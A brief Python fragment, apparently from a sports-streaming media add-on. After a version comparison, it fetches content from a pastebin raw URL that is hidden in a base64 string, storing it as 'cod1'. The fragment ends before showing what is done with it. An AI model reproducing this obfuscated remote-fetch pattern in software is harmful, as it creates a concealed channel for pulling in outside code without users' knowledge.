...
if not "<FutbolTream>" in datosConf:
...
if versionActual > comparaVersion:
    try:
        cod1 = httptools.downloadpage(base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3dEOTFGcG1Q".encode('utf-8')).decode('utf-8')).data
    except:
